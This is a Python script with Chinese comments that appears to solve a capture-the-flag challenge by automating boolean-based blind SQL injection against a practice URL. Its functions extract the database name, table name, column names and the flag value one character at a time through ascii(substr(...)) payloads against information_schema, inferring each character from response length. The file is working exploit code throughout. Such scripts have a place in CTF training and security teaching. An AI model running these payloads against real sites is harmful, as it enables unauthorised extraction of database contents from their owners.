import requests
#函数
#len() range() ord()
#方法
#format()

def get_dbname(db_len):
    # payload 1 'and ascii(substr(database(),1,1))>0#
    db_name = ""
    url_temp = "http://ctf5.shiyanbar.com/web/index_3.php?id=1"
    url_temp_len = len(requests.get(url_temp).text)
    url_payload = "http://ctf5.shiyanbar.com/web/index_3.php?id=1 'and ascii(substr(database(),{0},1))={1}%23"
    chars = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in range(1,db_len+1):
        db_name_temp = ""
        for j in chars:
            print("Query："+j)
            char_ascii = ord(j) #把字符转为ascii码
            url = url_payload.format(i,char_ascii) #把字符分别替换到字符串中
            #print(url)
            url_payload_len=len(requests.get(url).text)  #提交查询 并返回长度
            if url_temp_len == url_payload_len:
                print("第"+str(i)+"位字符为："+ j)
                db_name += j
                break

    print("数据库名为："+db_name)
def get_table_len():

    # payload ' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>0 %23
    table_name = ""
    url_temp = "http://ctf5.shiyanbar.com/web/index_3.php?id=1"
    url_temp_len = len(requests.get(url_temp).text)
    url_payload = "http://ctf5.shiyanbar.com/web/index_3.php?id=1'and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)={0} %23"
    for i in range(1,10):
        print("Qurey:"+str(i))
        url = url_payload.format(i)
        table_len = len(requests.get(url).text)
        if table_len == url_temp_len:
            print("table_len:"+str(i))
            break

def get_table_name(table_len):
    #  payload  'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}%23
    table_name = ""
    url_temp = "http://ctf5.shiyanbar.com/web/index_3.php?id=1"
    url_temp_len = len(requests.get(url_temp).text)
    url_payload = "http://ctf5.shiyanbar.com/web/index_3.php?id=1 'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}%23"
    chars = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in range(1,table_len+1):
        table_name_temp = ""
        for j in chars:
            print("Qurey:"+j)
            char_ascii= ord(j)
            url = url_payload.format(i,char_ascii)
            url_payload_len = len(requests.get(url).text)
            if url_temp_len == url_payload_len:
                print("第" + str(i) + "位字符为：" + j)
                table_name += j
                break
    print("table_name:"+table_name)



def get_column_name(key,column_len):
    # payload  'and ascii(substr((select column_name from information_schema.columns where table_name = 0x666C6167 limit {0},1), {1}, 1))={2}%23
    column_name = ""
    url_temp = "http://ctf5.shiyanbar.com/web/index_3.php?id=1"
    url_temp_len = len(requests.get(url_temp).text)
    url_payload = "http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select column_name from information_schema.columns where table_name = 0x666C6167 limit {0},1), {1}, 1))={2}%23"
    chars = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in  range(1,column_len+1):
        column_name_temp = ""
        for j in chars:
            print("Query:"+j)
            char_ascii = ord(j)
            url = url_payload.format(key,i,char_ascii)
            print(url)
            url_payload_len=len(requests.get(url).text)
            print(url_payload_len)
            if url_payload_len == url_temp_len:
                print("第" + str(i) + "位字符为：" + j)
                column_name += j
                break
    print("column_name:"+column_name)


def get_column_value(num,column_len):
    column_value = ""
    url_temp = "http://ctf5.shiyanbar.com/web/index_3.php?id=1"
    url_temp_len = len(requests.get(url_temp).text)
    url_payload = "http://ctf5.shiyanbar.com/web/index_3.php?id=1'and ascii(substr((select flag from flag limit {0},1),{1},1))={2} %23"
    chars = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!:;<=?@[\]^_`{|}\"#$%&'()*+,-/."
    for i in range(1,column_len+1):
        column_value_temp = ""
        for j in chars:
            print("Query:"+j)
            chars_ascii = ord(j)
            url = url_payload.format(num-1,i,chars_ascii)
            print(url)
            url_payload_len = len(requests.get(url).text)
            print(url_payload_len)
            if url_payload_len==url_temp_len:
                print("第"+str(i)+"位字符为："+j)
                column_value+=j
                break
    print("column_value:"+column_value)

if __name__ == '__main__':

	#返回数据库名 需要传入数据库长度
	#get_dbname(4)

	#返回表长度
	#get_table_len()

	#返回表名 需要传入表长度
	#get_table_name(4)

	#返回字段名 需要传入字段位置和字段长度
	#get_column_name(0,4)

	#返回字段值 需要传入记录值数量和记录值长度
	get_column_value(1,26)


